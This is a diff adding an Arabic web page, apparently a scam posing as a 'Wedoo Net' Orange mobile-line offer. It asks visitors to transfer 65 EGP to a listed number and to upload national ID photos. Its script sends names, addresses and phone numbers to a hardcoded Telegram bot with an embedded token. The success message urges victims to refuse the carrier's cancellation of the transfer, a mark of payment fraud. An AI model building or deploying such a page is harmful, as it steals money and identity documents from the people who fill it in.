@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wedoo Net - عروض التحويل لاورانج</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fffbea;
+            text-align: center;
+            color: #333;
+        }
+
+        header {
+            background-color: #ffc107;
+            color: #333;
+            padding: 20px 0;
+            font-size: 1.5rem;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+        }
+
+        .section-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .offer-details {
+            background-color: #ffecb3;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .offer-details h2 {
+            margin: 5px 0;
+            font-size: 1.3rem;
+        }
+
+        .offer-details span {
+            font-size: 1rem;
+            font-weight: bold;
+        }
+
+        .note {
+            background-color: #ffeaa7;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        form {
+            text-align: left;
+        }
+
+        form label {
+            font-weight: bold;
+        }
+
+        form input, form button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+            box-sizing: border-box;
+        }
+
+        form button {
+            background-color: #ffc107;
+            color: #333;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: background-color 0.3s;
+        }
+
+        form button:hover {
+            background-color: #e0a800;
+        }
+
+        .success-message {
+            display: none;
+            margin-top: 20px;
+            color: green;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        Wedoo Net
+    </header>
+
+    <div class="container">
+        <div class="offer-details">
+            <h2>عروض التحويل لاورانج</h2>
+            <span>السعر: 65 جنيه</span>
+        </div>
+
+        <div class="note">
+            قم بتحويل المبلغ إلى هذا الرقم: **01097891442** وارفع الإيصال مع صورة البطاقة.
+        </div>
+
+        <form id="orange-offer-form">
+            <label for="full-name">الاسم بالكامل:</label>
+            <input type="text" id="full-name" name="fullName" placeholder="أدخل اسمك بالكامل" required>
+
+            <label for="address">العنوان بالتفاصيل:</label>
+            <input type="text" id="address" name="address" placeholder="أدخل عنوانك بالتفصيل" required>
+
+            <label for="phone1">رقم الهاتف للتواصل:</label>
+            <input type="text" id="phone1" name="phone1" placeholder="أدخل رقم الهاتف الأول" required>
+
+            <label for="phone2">رقم هاتف آخر للتواصل:</label>
+            <input type="text" id="phone2" name="phone2" placeholder="أدخل رقم الهاتف الثاني" required>
+
+            <label>رفع صورة البطاقة:</label>
+            <input type="file" id="id-front" name="idFront" accept="image/*" required>
+            <input type="file" id="id-back" name="idBack" accept="image/*" required>
+
+            <label>رفع اسكرين التحويل :</label>
+            <input type="file" id="extra-files" name="extraFiles" accept="image/*" multiple>
+
+            <button type="button" id="submit-button">شراء</button>
+        </form>
+
+        <div class="success-message" id="success-message">
+            تم إرسال طلبك بنجاح. من فضلك، لا تقبل إلغاء التحويل من الشركة.
+        </div>
+    </div>
+
+    <script>
+        const telegramToken = "7818812290:AAGo9sue1gJOWfOaac5xdS_PaGXUTVDm0GI";
+        const chatId = "7122151638";
+
+        document.getElementById("submit-button").addEventListener("click", function() {
+            const formData = new FormData();
+
+            // جمع البيانات
+            formData.append("fullName", document.getElementById("full-name").value);
+            formData.append("address", document.getElementById("address").value);
+            formData.append("phone1", document.getElementById("phone1").value);
+            formData.append("phone2", document.getElementById("phone2").value);
+            formData.append("pageTitle", "عروض خطوط أورانج - 250 جنيه");
+
+            // إضافة صور البطاقة
+            formData.append("idFront", document.getElementById("id-front").files[0]);
+            formData.append("idBack", document.getElementById("id-back").files[0]);
+
+            // إضافة ملفات إضافية
+            const extraFiles = document.getElementById("extra-files").files;
+            for (let i = 0; i < extraFiles.length; i++) {
+                formData.append(`extraFile${i}`, extraFiles[i]);
+            }
+
+            // إرسال المعلومات والصور إلى بوت التليجرام
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: `
+طلب جديد من عروض خطوط أورانج:
+- الاسم: ${formData.get("fullName")}
+- العنوان: ${formData.get("address")}
+- رقم الهاتف الأول: ${formData.get("phone1")}
+- رقم الهاتف الثاني: ${formData.get("phone2")}
+                    `
+                })
+            }).then(() => {
+                document.getElementById("success-message").style.display = "block";
+            }).catch(() => {
+                alert("حدث خطأ أثناء الإرسال!");
+            });
+        });
+    </script>
+</body>
+</html>
